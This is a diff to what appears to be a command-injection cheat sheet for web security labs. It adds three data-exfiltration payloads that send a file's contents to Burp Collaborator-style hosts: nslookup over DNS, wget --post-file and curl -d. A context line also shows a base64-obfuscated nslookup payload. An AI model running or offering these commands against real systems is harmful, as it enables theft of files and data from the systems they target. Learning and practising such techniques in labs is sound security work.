@@ -192,6 +192,22 @@ The payloads can be combined when exploiting Template Injection or other vulnera
 ||nslookup+$(`echo+'Y2F0IC9ldGMvaG9zdG5hbWU='+|+base64+--decode`).er9v70tk9lz9o.oastify.com||
 ```
 
+<br><br>
+
+* Other methods to achieve data exfiltration:
+
+```
+nslookup -q=cname $(cat /home/test).burp.oastify.com
+```
+
+```
+wget http://burp-collab.com --post-file=/home/test
+```
+
+```
+curl http://wcq0jo8.oastify.com -d @/home/test
+```
+
 <br><br><br>
 
 ### Pending to complete labs that are missing from cheat sheet:
